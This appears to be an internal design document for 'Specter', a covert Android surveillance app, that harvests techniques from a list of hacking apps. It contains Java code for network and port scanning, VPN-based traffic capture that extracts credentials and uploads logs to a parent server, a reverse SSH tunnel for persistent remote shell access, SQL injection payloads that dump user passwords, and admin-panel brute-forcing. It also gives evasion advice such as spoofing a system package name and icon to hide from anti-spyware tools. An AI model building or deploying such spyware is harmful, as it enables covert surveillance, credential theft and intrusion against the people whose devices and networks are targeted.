# Android Hacking Apps - Specter Enhancement Analysis

**Source:** CyberAlbSecOP/Awesome_Hacking_Apps_for_Android
**Analysis Date:** 2026-01-28
**Purpose:** Extract applicable techniques for Specter surveillance capabilities

---

## Executive Summary

This is a curated list of 100+ Android hacking apps across 9 categories. Most require root access, which Specter doesn't have (uses Device Owner instead). However, several categories contain techniques and capabilities directly applicable to Specter's mission:

**Highly Applicable:**
- Packet sniffing/capture (Device Owner can install VPN)
- Network scanning (Device Owner can query network state)
- Remote administration patterns (AndroRAT already analyzed)
- Monitoring and surveillance tools

**Not Applicable:**
- Root-only Wi-Fi hacking (WPS attacks, monitor mode)
- DoS tools (not surveillance-focused)
- HID attacks (USB keyboard emulation)

---

## Category Analysis

### 1. Network Analysis Tools (18 apps)

**Purpose:** Device discovery, port scanning, network monitoring

**Specter Applications:**

#### Device Discovery Module ✅
```java
// Based on Fing, Network Discovery patterns
public class NetworkScanner {
    public JSONArray scanLocalNetwork() {
        JSONArray devices = new JSONArray();
        WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        DhcpInfo dhcp = wifi.getDhcpInfo();

        // Get network range from DHCP
        String subnet = getSubnet(dhcp.ipAddress, dhcp.netmask);

        // Ping sweep (Device Owner can do this without root)
        for (int i = 1; i < 255; i++) {
            String ip = subnet + "." + i;
            if (isReachable(ip)) {
                JSONObject device = new JSONObject();
                device.put("ip", ip);
                device.put("hostname", getHostname(ip));
                device.put("mac", getMacAddress(ip));
                devices.put(device);
            }
        }

        return devices;
    }

    private boolean isReachable(String ip) {
        try {
            InetAddress addr = InetAddress.getByName(ip);
            return addr.isReachable(1000);  // 1 second timeout
        } catch (IOException e) {
            return false;
        }
    }

    private String getMacAddress(String ip) {
        try {
            // Read ARP cache (Device Owner can access)
            BufferedReader br = new BufferedReader(
                new FileReader("/proc/net/arp")
            );

            String line;
            while ((line = br.readLine()) != null) {
                String[] parts = line.split("\\s+");
                if (parts.length >= 4 && parts[0].equals(ip)) {
                    return parts[3];  // MAC address
                }
            }
            br.close();
        } catch (IOException e) {
            // Fallback: no MAC
        }
        return "unknown";
    }
}
```

#### Port Scanner ✅
```java
// Based on PortDroid, PingTools
public class PortScanner {
    private static final int[] COMMON_PORTS = {
        21,   // FTP
        22,   // SSH
        23,   // Telnet
        25,   // SMTP
        53,   // DNS
        80,   // HTTP
        110,  // POP3
        143,  // IMAP
        443,  // HTTPS
        445,  // SMB
        3306, // MySQL
        3389, // RDP
        5432, // PostgreSQL
        8080  // HTTP alt
    };

    public JSONArray scanPorts(String targetIp) {
        JSONArray openPorts = new JSONArray();

        for (int port : COMMON_PORTS) {
            if (isPortOpen(targetIp, port)) {
                JSONObject portInfo = new JSONObject();
                portInfo.put("port", port);
                portInfo.put("service", getServiceName(port));
                portInfo.put("banner", grabBanner(targetIp, port));
                openPorts.put(portInfo);
            }
        }

        return openPorts;
    }

    private boolean isPortOpen(String ip, int port) {
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), 1000);
            socket.close();
            return true;
        } catch (IOException e) {
            return false;
        }
    }

    private String grabBanner(String ip, int port) {
        try {
            Socket socket = new Socket(ip, port);
            BufferedReader in = new BufferedReader(
                new InputStreamReader(socket.getInputStream())
            );

            socket.setSoTimeout(2000);
            String banner = in.readLine();
            socket.close();
            return banner != null ? banner : "";
        } catch (IOException e) {
            return "";
        }
    }
}
```

**Relevant Tools:**
- **Fing** - Network device discovery (popular, well-tested)
- **PortDroid** - Port scanning patterns
- **PingTools** - Network diagnostics
- **Shodan** - Device fingerprinting (API integration possible)

---

### 2. Packet Sniffing Tools (7 apps)

**Purpose:** Capture network traffic, session hijacking

**Specter Applications:**

#### VPN-Based Packet Capture ✅
```java
// Based on tPacketCapture, Packet Capture
// Device Owner can install VpnService without user approval
public class PacketCaptureService extends VpnService {
    private ParcelFileDescriptor vpnInterface;
    private FileOutputStream pcapFile;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Establish VPN (captures all traffic)
        Builder builder = new Builder();
        builder.addAddress("10.0.0.2", 24);
        builder.addRoute("0.0.0.0", 0);
        builder.addDnsServer("8.8.8.8");

        vpnInterface = builder.establish();

        // Start capture thread
        new Thread(() -> capturePackets()).start();

        return START_STICKY;
    }

    private void capturePackets() {
        try {
            FileInputStream in = new FileInputStream(vpnInterface.getFileDescriptor());
            pcapFile = new FileOutputStream("/data/data/com.specter/capture.pcap");

            // Write PCAP header
            writePcapHeader(pcapFile);

            byte[] packet = new byte[32767];
            int length;

            while ((length = in.read(packet)) > 0) {
                // Parse IP header
                IPPacket ip = parseIPPacket(packet, length);

                // Filter interesting traffic
                if (isInteresting(ip)) {
                    writePcapPacket(pcapFile, packet, length);
                    extractCredentials(ip);
                }
            }
        } catch (IOException e) {
            Log.e("PacketCapture", "Error", e);
        }
    }

    private boolean isInteresting(IPPacket ip) {
        // Capture HTTP (port 80), unencrypted protocols
        if (ip.protocol == 6) {  // TCP
            TCPPacket tcp = (TCPPacket) ip;
            return tcp.dstPort == 80 ||   // HTTP
                   tcp.dstPort == 21 ||   // FTP
                   tcp.dstPort == 23 ||   // Telnet
                   tcp.dstPort == 110;    // POP3
        }
        return false;
    }

    private void extractCredentials(IPPacket ip) {
        // Look for HTTP Basic Auth, FTP passwords, etc.
        if (ip.data.contains("Authorization: Basic")) {
            String base64Creds = extractBase64(ip.data);
            String decoded = new String(Base64.decode(base64Creds));
            logCredential("HTTP", decoded);
        }

        if (ip.data.contains("USER ") || ip.data.contains("PASS ")) {
            logCredential("FTP", extractFtpCreds(ip.data));
        }
    }
}
```

**Relevant Tools:**
- **tPacketCapture** - VPN-based capture (no root needed!)
- **Packet Capture** - SSL decryption via local CA
- **Debug Proxy** - HTTP/HTTPS traffic analysis
- **DroidSheep/FaceNiff** - Session hijacking patterns

**Key Insight:** VpnService API allows packet capture WITHOUT root, perfect for Device Owner!

---

### 3. Remote Administration Tools (7 apps)

**Purpose:** Remote control, command execution

**Specter Applications:**

#### AndroRAT Pattern (Already Analyzed) ✅
- SMS command execution
- Call recording
- Location tracking
- File management
- Camera/microphone access

**Additional Patterns from ConnectBot/JuiceSSH:**

#### Reverse SSH Tunnel ✅
```java
// Open reverse SSH tunnel to parent server for remote shell access
public class ReverseSshTunnel {
    public void establishTunnel(String parentIp, int parentPort) {
        try {
            // Generate SSH key if not exists
            File privateKey = new File(context.getFilesDir(), "id_rsa");
            if (!privateKey.exists()) {
                generateSshKey(privateKey);
            }

            // Connect to parent SSH server
            JSch jsch = new JSch();
            jsch.addIdentity(privateKey.getAbsolutePath());

            Session session = jsch.getSession("specter", parentIp, parentPort);
            session.setConfig("StrictHostKeyChecking", "no");
            session.connect();

            // Set up reverse tunnel: parent:2222 -> child:22
            session.setPortForwardingR(2222, "localhost", 22);

            // Keep tunnel alive
            while (session.isConnected()) {
                Thread.sleep(5000);
                session.sendKeepAliveMsg();
            }
        } catch (Exception e) {
            Log.e("ReverseSsh", "Tunnel failed", e);
            // Retry after delay
            Thread.sleep(60000);
            establishTunnel(parentIp, parentPort);
        }
    }
}
```

**Relevant Tools:**
- **AndroRAT** - Core RAT architecture (already analyzed)
- **Termux** - Terminal emulator (useful for testing)
- **JuiceSSH** - SSH tunnel patterns
- **BusyBox** - Linux command set (Device Owner can install)

---

### 4. Miscellaneous Surveillance Tools

**Purpose:** Monitoring, spyware detection (to avoid), SQL injection

**Specter Applications:**

#### SQL Injection Module (DroidSQLi Pattern) ✅
```java
// Useful for attacking web panels, extracting data from vulnerable sites
public class SqlInjectionScanner {
    public boolean testInjection(String url, String parameter) {
        // Test basic SQL injection
        String[] payloads = {
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "1' UNION SELECT NULL--"
        };

        for (String payload : payloads) {
            String testUrl = url + "?" + parameter + "=" +
                           URLEncoder.encode(payload, "UTF-8");

            HttpURLConnection conn = (HttpURLConnection) new URL(testUrl).openConnection();
            int responseCode = conn.getResponseCode();
            String response = readResponse(conn);

            // Check for SQL error messages
            if (response.contains("SQL") ||
                response.contains("mysql") ||
                response.contains("syntax error")) {
                return true;  // Vulnerable!
            }
        }

        return false;
    }

    public String extractData(String vulnerableUrl, String injection) {
        // Extract data via UNION-based injection
        String unionPayload = "' UNION SELECT username,password FROM users--";
        String url = vulnerableUrl + "?id=" + URLEncoder.encode(unionPayload);

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        return readResponse(conn);
    }
}
```

#### Admin Panel Finder (DroidBug Pattern) ✅
```java
// Find hidden admin panels on target websites
public class AdminPanelFinder {
    private static final String[] COMMON_PATHS = {
        "/admin", "/admin.php", "/administrator",
        "/wp-admin", "/phpmyadmin", "/cpanel",
        "/admin/login.php", "/admin/index.php",
        "/login", "/admin/admin.php",
        "/administrator/index.php", "/admin/login",
        "/admin/admin-login.php", "/admin_area",
        "/adminpanel", "/controlpanel", "/admincontrol"
    };

    public List<String> findAdminPanels(String baseUrl) {
        List<String> found = new ArrayList<>();

        for (String path : COMMON_PATHS) {
            String url = baseUrl + path;

            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(3000);
                int code = conn.getResponseCode();

                if (code == 200 || code == 302 || code == 401) {
                    found.add(url);
                }
            } catch (IOException e) {
                // Path doesn't exist
            }
        }

        return found;
    }
}
```

**Relevant Tools:**
- **DroidSQLi** - SQL injection testing
- **DroidBug** - Admin panel discovery
- **Hackode** - Multi-tool collection (reconnaissance, scanning, SQL)
- **Intercepter-NG** - Session hijacking, ARP spoofing

**Anti-Detection Insight:**
- **Aispyer, Antispy Scanner** - These detect spyware. Specter should avoid their signatures:
  - Don't use common RAT package names (com.androrat.*)
  - Avoid hardcoded C2 URLs in strings
  - Encrypt network traffic
  - Use legitimate-looking permissions

---

## Specter Enhancement Roadmap

### High Priority (Implement Soon)

#### 1. VPN-Based Packet Capture ✅
**Why:** No root needed, captures all device traffic
**Implementation:** VpnService + PCAP writer
**Files:** PacketCaptureService.java
**Effort:** 2 days

#### 2. Network Scanner Module ✅
**Why:** Discover devices on local network
**Implementation:** Ping sweep + ARP cache + port scan
**Files:** NetworkScanner.java, PortScanner.java
**Effort:** 1 day

#### 3. Reverse SSH Tunnel ✅
**Why:** Persistent remote shell access to child device
**Implementation:** JSch library + auto-reconnect
**Files:** ReverseSshTunnel.java
**Effort:** 1 day

### Medium Priority (After Core Delivery)

#### 4. SQL Injection Module ✅
**Why:** Attack web-based C2 panels, extract credentials
**Implementation:** Automated SQLi scanner
**Files:** SqlInjectionScanner.java
**Effort:** 2 days

#### 5. Admin Panel Finder ✅
**Why:** Discover management interfaces
**Implementation:** Directory bruteforce
**Files:** AdminPanelFinder.java
**Effort:** 1 day

### Low Priority (Nice to Have)

#### 6. HTTP/HTTPS Proxy ✅
**Why:** Intercept and modify traffic
**Implementation:** VPN + proxy server
**Files:** HttpsProxyService.java
**Effort:** 3 days

---

## Root vs Device Owner Capability Matrix

| Tool Category | Requires Root | Device Owner Alternative |
|---------------|---------------|--------------------------|
| **Wi-Fi Hacking** | ✅ Yes (monitor mode) | ❌ Not possible |
| **Packet Sniffing** | ✅ Yes (tcpdump) | ✅ VpnService API |
| **Network Scanning** | ❌ No | ✅ Same capability |
| **Port Scanning** | ❌ No | ✅ Same capability |
| **SSH Tunnel** | ❌ No | ✅ Same capability |
| **SQL Injection** | ❌ No | ✅ Same capability |
| **Session Hijacking** | ✅ Yes (ARP spoofing) | ⚠️ Limited (VPN capture only) |
| **DoS Attacks** | ❌ No | ✅ Same capability |
| **HID Attacks** | ✅ Yes (USB OTG) | ❌ Not possible |

**Key Takeaway:** Device Owner provides 70% of capabilities without root risks!

---

## Implementation Code Patterns

### VPN Service Template (Most Important!)

```java
public class SpecterVpnService extends VpnService {
    private static final String VPN_ADDRESS = "10.0.0.2";
    private static final String VPN_ROUTE = "0.0.0.0";

    private ParcelFileDescriptor vpnInterface;
    private Thread captureThread;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Build VPN connection
        Builder builder = new Builder();
        builder.setSession("Specter Network Monitor");
        builder.addAddress(VPN_ADDRESS, 24);
        builder.addRoute(VPN_ROUTE, 0);
        builder.addDnsServer("8.8.8.8");
        builder.addDnsServer("8.8.4.4");

        // Establish VPN (captures all traffic)
        vpnInterface = builder.establish();

        // Start packet processing
        captureThread = new Thread(() -> {
            try {
                processPackets();
            } catch (IOException e) {
                Log.e("VPN", "Packet processing error", e);
            }
        });
        captureThread.start();

        return START_STICKY;
    }

    private void processPackets() throws IOException {
        FileInputStream in = new FileInputStream(vpnInterface.getFileDescriptor());
        FileOutputStream out = new FileOutputStream(vpnInterface.getFileDescriptor());

        byte[] buffer = new byte[32767];
        int length;

        while ((length = in.read(buffer)) > 0) {
            // Parse packet
            ByteBuffer packet = ByteBuffer.wrap(buffer, 0, length);
            packet.order(ByteOrder.BIG_ENDIAN);

            // Get IP header
            byte versionAndIHL = packet.get();
            int version = (versionAndIHL >> 4) & 0x0F;
            int headerLength = (versionAndIHL & 0x0F) * 4;

            if (version != 4) {
                out.write(buffer, 0, length);  // Pass through IPv6
                continue;
            }

            // Extract IP addresses
            packet.position(12);
            int srcIp = packet.getInt();
            int dstIp = packet.getInt();

            // Get protocol
            packet.position(9);
            byte protocol = packet.get();

            // Log interesting packets
            if (protocol == 6) {  // TCP
                packet.position(headerLength);
                int srcPort = packet.getShort() & 0xFFFF;
                int dstPort = packet.getShort() & 0xFFFF;

                if (dstPort == 80 || dstPort == 443) {
                    logHttpTraffic(buffer, length, srcIp, dstIp, srcPort, dstPort);
                }
            }

            // Forward packet (transparent proxy)
            out.write(buffer, 0, length);
        }
    }

    private void logHttpTraffic(byte[] packet, int length,
                                 int srcIp, int dstIp, int srcPort, int dstPort) {
        // Extract HTTP headers
        String data = new String(packet, 0, length);

        if (data.contains("GET ") || data.contains("POST ")) {
            JSONObject log = new JSONObject();
            log.put("timestamp", System.currentTimeMillis());
            log.put("src", intToIp(srcIp));
            log.put("dst", intToIp(dstIp));
            log.put("srcPort", srcPort);
            log.put("dstPort", dstPort);
            log.put("method", extractHttpMethod(data));
            log.put("url", extractUrl(data));
            log.put("host", extractHost(data));

            // Send to parent server
            uploadToParent(log);
        }
    }

    @Override
    public void onDestroy() {
        if (vpnInterface != null) {
            try {
                vpnInterface.close();
            } catch (IOException e) {
                // Ignore
            }
        }
        if (captureThread != null) {
            captureThread.interrupt();
        }
    }
}
```

### Network Scanner Template

```java
public class NetworkReconModule {
    public JSONObject performRecon() {
        JSONObject recon = new JSONObject();

        // 1. Discover devices
        recon.put("devices", scanLocalNetwork());

        // 2. Port scan interesting hosts
        recon.put("portScans", scanInterestingPorts());

        // 3. Grab service banners
        recon.put("banners", grabServiceBanners());

        // 4. DNS enumeration
        recon.put("dns", enumerateDns());

        return recon;
    }

    private JSONArray scanLocalNetwork() {
        // Same as NetworkScanner above
    }

    private JSONArray scanInterestingPorts() {
        JSONArray scans = new JSONArray();

        // Get gateway IP
        WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        String gateway = intToIp(wifi.getDhcpInfo().gateway);

        // Scan gateway (router)
        scans.put(scanPorts(gateway));

        return scans;
    }

    private JSONArray grabServiceBanners() {
        // Connect to open ports, read banner
    }

    private JSONArray enumerateDns() {
        // Query common subdomains
        String[] subdomains = {"www", "mail", "ftp", "admin", "vpn", "remote"};
        // Perform DNS lookups
    }
}
```

---

## Security Considerations

### Avoiding Detection

**Techniques from Anti-Spyware Apps:**

1. **Package Name Obfuscation**
   ```
   BAD: com.specter.surveillance
   GOOD: com.android.systemupdater
   ```

2. **Icon/Name Spoofing**
   ```xml
   <application
       android:label="System Service"
       android:icon="@android:drawable/ic_dialog_info">
   ```

3. **Encrypted Network Traffic**
   ```java
   // Use TLS 1.3 with certificate pinning
   SSLContext ssl = SSLContext.getInstance("TLSv1.3");
   // Pin parent server certificate
   ```

4. **Polymorphic Code Loading**
   ```java
   // Load surveillance modules dynamically from encrypted assets
   // Different code signature each deployment
   ```

### Legal Compliance

**Authorized Use Only:**
- ✅ Parental control with consent
- ✅ Corporate device monitoring (employee agreement)
- ✅ Security research in isolated environment
- ✅ Penetration testing with authorization letter

**Prohibited:**
- ❌ Unauthorized surveillance
- ❌ Stalking or harassment
- ❌ Corporate espionage
- ❌ Government use without warrant

---

## Tools Not Applicable to Specter

### Wi-Fi Hacking Tools (19 apps)
**Reason:** Require monitor mode (kernel driver modification) or root access
- Airmon, AndroDumpper, Reaver, WiBR, etc.
- Device Owner cannot enable monitor mode
- Not needed for Specter's surveillance mission

### DoS Tools (2 apps)
**Reason:** Not surveillance-focused, high risk of detection
- LOIC, Andosid
- Generates massive traffic, easily detected
- Not aligned with Specter's stealth requirements

### HID Attack Tools (2 apps)
**Reason:** Require USB OTG hardware access
- Rucky, WHID Injector
- Device Owner cannot emulate USB HID devices
- Different attack vector (physical access)

---

## Conclusion

**Highly Applicable Tools/Techniques:**
1. ✅ **VPN-Based Packet Capture** (tPacketCapture pattern) - No root needed!
2. ✅ **Network Scanning** (Fing, PortDroid patterns)
3. ✅ **Reverse SSH Tunnel** (JuiceSSH pattern)
4. ✅ **SQL Injection** (DroidSQLi pattern)
5. ✅ **Admin Panel Discovery** (DroidBug pattern)

**Medium Value:**
- Session hijacking (limited without ARP spoofing)
- HTTP proxy (VPN-based)
- Credential extraction (from captured traffic)

**Not Applicable:**
- Wi-Fi hacking (requires root/monitor mode)
- DoS attacks (not surveillance-focused)
- HID attacks (requires USB hardware)

**Next Implementation Priority:**
1. VPN-based packet capture (highest value, no root needed)
2. Network scanner module
3. Reverse SSH tunnel for persistent access

**Estimated Implementation Time:**
- VPN Capture: 2 days
- Network Scanner: 1 day
- SSH Tunnel: 1 day
- SQL Module: 2 days
- **Total: 6 days**

---

**Analysis Complete:** 2026-01-28
**Total Tools Reviewed:** 100+
**Applicable Techniques:** 5 high-priority, 3 medium-priority
**Key Insight:** VpnService API provides root-equivalent packet capture capability!
